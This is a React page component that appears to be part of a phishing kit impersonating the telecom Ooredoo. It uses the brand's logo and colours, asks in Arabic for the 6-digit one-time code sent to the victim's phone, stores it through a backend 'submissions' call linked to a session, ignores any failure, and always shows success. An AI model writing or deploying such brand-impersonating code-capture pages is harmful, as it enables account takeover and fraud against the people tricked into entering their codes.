import { useState } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";

export default function OtpOoredoo() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const { language, setLanguage } = useLanguage();
  const sessionId = localStorage.getItem("sessionId") || "";

  const isArabic = language === "ar";

  const [otp, setOtp] = useState("");
  const submitOtpMutation = trpc.submissions.submitOtp.useMutation();

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
    setOtp(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length !== 6) {
      toast.error("يجب أن يكون الرمز 6 أرقام");
      return;
    }
    try {
      await submitOtpMutation.mutateAsync({
        sessionId,
        otpCode: otp,
        otpType: "ooredoo",
      });
      toast.success("تم التحقق بنجاح");
    } catch (error) {
      console.error("Error saving Ooredoo OTP in DB, continuing anyway:", error);
    }
    setLocation(`/success?session=${sessionId}`);
  };

  return (
    <div className="page-wrapper">
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
        .page-wrapper { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; padding: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; box-sizing: border-box; }
        
        header { padding: 15px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #f0f0f0; background-color: #ffffff; }
        .menu-icon { font-size: 24px; cursor: pointer; color: #d71920; font-weight: bold; width: 40px; }
        .logo-container { flex-grow: 1; display: flex; align-items: center; justify-content: center; background-color: #ffffff !important; }
        .logo-container img { height: 35px; width: auto; display: block; }
        
        .lang-switch { width: 50px; text-align: center; font-size: 10px; color: #d71920; border: 1px solid #d71920; padding: 3px 5px; border-radius: 12px; cursor: pointer; font-weight: bold; }

        .content-body { padding: 20px; }
        h1 { font-size: 24px; color: #333; margin-top: 20px; margin-bottom: 10px; }
        .sub-text { color: #666; font-size: 14px; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; }
        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; text-align: center; letter-spacing: 5px; }
        .login-btn { width: 100%; padding: 15px; background-color: #d71920; color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; max-width: 300px; margin: 0 auto; display: block; margin-top: 20px; }
      `}</style>
      <div className="container">
        <header>
          <div className="menu-icon">☰</div>
          <div className="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e0/Ooredoo_logo.svg" alt="Ooredoo Logo" />
          </div>
          <div className="lang-switch" onClick={() => setLocation("/otp-ooredoo-en")} style={{ cursor: "pointer" }}>
            English
          </div>
        </header>
        <div className="content-body">
          <h1>رمز التحقق</h1>
          <p className="sub-text">يرجى إدخال رمز التحقق (OTP) المرسل إلى هاتفك.</p>
          <form onSubmit={handleSubmit}>
            <div className="input-group">
              <input
                type="text"
                placeholder="000000"
                maxLength={6}
                value={otp}
                onChange={handleOtpChange}
                required
              />
            </div>
            <button type="submit" className="login-btn">
              تأكيد
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
